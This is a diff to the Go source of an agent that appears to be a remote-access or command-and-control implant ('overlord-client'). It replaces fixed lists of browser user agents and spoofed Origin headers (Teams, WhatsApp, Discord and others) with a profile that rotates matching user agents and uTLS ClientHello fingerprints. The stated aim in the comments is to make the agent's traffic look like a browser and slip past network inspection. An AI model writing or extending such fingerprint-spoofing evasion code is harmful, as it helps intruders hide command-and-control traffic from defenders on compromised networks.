@@ -36,6 +36,7 @@ import (
 	"overlord-client/cmd/agent/tlsfingerprint"
 	"overlord-client/cmd/agent/wire"
 
+	utls "github.com/refraction-networking/utls"
 	"nhooyr.io/websocket"
 )
 
@@ -248,36 +249,6 @@ func tryRefreshServerList(cfg *config.Config, lastSolRefresh *time.Time, current
 	}
 }
 
-// malleableUserAgents mimics real browser WebSocket upgrades so the handshake
-// blends into normal HTTPS traffic on network inspection.
-var malleableUserAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-}
-
-// malleableAcceptLanguages rotates locale strings to avoid a fixed fingerprint.
-var malleableAcceptLanguages = []string{
-	"en-US,en;q=0.9",
-	"en-GB,en;q=0.9,en-US;q=0.8",
-	"en-US,en;q=0.8,fr;q=0.5",
-	"en-US,en;q=0.9,de;q=0.7",
-	"en-CA,en;q=0.9,fr-CA;q=0.8",
-	"en-AU,en;q=0.9",
-}
-
-// malleableOrigins is a set of plausible Origin headers for the WS upgrade.
-var malleableOrigins = []string{
-	"https://teams.microsoft.com",
-	"https://web.whatsapp.com",
-	"https://discord.com",
-	"https://slack.com",
-	"https://meet.google.com",
-}
-
 // agentNonce generates a 16-byte cryptographically random hex nonce for
 // replay-attack protection.
 func agentNonce() string {
@@ -296,8 +267,8 @@ func buildDialOptions(cfg config.Config, transport *http.Transport) *websocket.D
 	headers.Set("x-agent-nonce", agentNonce())
 
 	// Malleable profile: disguise WebSocket upgrade as a browser request.
-	ua := malleableUserAgents[mrand.Intn(len(malleableUserAgents))]
-	headers.Set("User-Agent", ua)
+	// randomProfile() picks a coherent UA+JA3 pair from malleable.go.
+	headers.Set("User-Agent", randomProfile().UserAgent)
 	headers.Set("Accept-Language", malleableAcceptLanguages[mrand.Intn(len(malleableAcceptLanguages))])
 	headers.Set("Accept-Encoding", "gzip, deflate, br")
 	headers.Set("Cache-Control", "no-cache")
@@ -487,8 +458,11 @@ func createHTTPTransport(cfg config.Config) (*http.Transport, error) {
 	}
 	transport.DialContext = tcpDial
 	// DialTLSContext replaces the standard Go TLS handshake with a uTLS
-	// Chrome-133 ClientHello so the JA3/JA4 fingerprint looks like a browser.
-	transport.DialTLSContext = tlsfingerprint.UTLSDialFunc(tcpDial, tlsConfig)
+	// ClientHello that rotates between Chrome/Edge/Firefox on each dial so
+	// the JA3/JA4 fingerprint never presents a static signature.
+	transport.DialTLSContext = tlsfingerprint.UTLSDialFunc(tcpDial, tlsConfig,
+		func() utls.ClientHelloID { return randomProfile().HelloSpec },
+	)
 	return transport, nil
 }
 
